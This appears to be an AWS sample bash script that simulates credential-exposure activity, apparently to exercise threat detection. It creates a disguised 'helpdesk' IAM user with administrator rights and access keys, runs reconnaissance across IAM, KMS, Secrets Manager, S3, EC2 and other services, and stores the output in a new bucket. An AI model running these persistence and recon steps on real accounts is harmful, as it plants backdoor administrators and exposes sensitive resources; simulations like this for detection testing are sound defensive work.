#!/bin/bash
# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: MIT-0
#
# requirements: AWS CLI profile, jq, AWS Region
# example: ```./simulate_credential_exposure_activity.sh credential_exposure us-east-1```
# jq download https://stedolan.github.io/jq/download/
#
PROFILE=${1}
REGION=${2}
PERSISTENCE_USER=$(echo "helpdesk-"$(uuidgen) | awk '{print tolower($0)}')
echo "checking credential account ownership"
aws sts get-caller-identity --profile ${PROFILE} &> /dev/null
echo "creating persistence IAM User"
aws iam create-user --user-name ${PERSISTENCE_USER} --profile ${PROFILE}  &> /dev/null
echo "make persistence user administrator"
aws iam attach-user-policy --user-name ${PERSISTENCE_USER} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile ${PROFILE}  &> /dev/null
echo "create IAM Access Key for user"
aws iam create-access-key --user-name ${PERSISTENCE_USER} --profile ${PROFILE} > ak.json
# saves current AWS env
echo "preserving existing AWS ENV"
AWS_ID=${AWS_ACCESS_KEY_ID}
AWS_SK=${AWS_SECRET_ACCESS_KEY}
AWS_DR=${AWS_DEFAULT_REGION}
AWS_ST=${AWS_SESSION_TOKEN}
export AWS_ACCESS_KEY_ID=$(jq -r '.AccessKey.AccessKeyId' ak.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r '.AccessKey.SecretAccessKey' ak.json)
export AWS_DEFAULT_REGION=${REGION}
unset AWS_SESSION_TOKEN
echo "deletes IAM Access Key ID and Secret from disk"
rm -f ak.json
error=1
# https://docs.aws.amazon.com/IAM/latest/UserGuide/troubleshoot_general.html#troubleshoot_general_eventual-consistency
while [ ${error} -ne 0 ]
do
  echo "waiting ${PERSISTENCE_USER} IAM Access Keys to be available"
  aws sts get-caller-identity &> /dev/null
  error=${?}
  sleep 1
done
# light recon
echo "performing light recon"
aws sts get-caller-identity > recon.txt
aws iam list-roles >> recon.txt
aws lambda list-functions >> recon.txt
aws kms list-keys >> recon.txt
aws kms list-aliases >> recon.txt
aws logs describe-destinations >> recon.txt
aws s3api list-buckets >> recon.txt
aws ec2 describe-instances >> recon.txt
aws secretsmanager list-secrets >> recon.txt
aws sqs list-queues >> recon.txt
BUCKET_NAME=$(echo "simulation-"$(uuidgen) | awk '{print tolower($0)}')
# save recon for posterity
aws s3api create-bucket --bucket ${BUCKET_NAME}  &> /dev/null
aws s3api put-object --bucket ${BUCKET_NAME} --key stuff --body recon.txt  &> /dev/null
rm -f recon.txt
# restores AWS ENV
echo "restores AWS ENV"
export AWS_SESSION_TOKEN=${AWS_ST}
export AWS_ACCESS_KEY_ID=${AWS_ID}
export AWS_SECRET_ACCESS_KEY=${AWS_SK}
export AWS_DEFAULT_REGION=${AWS_DR}

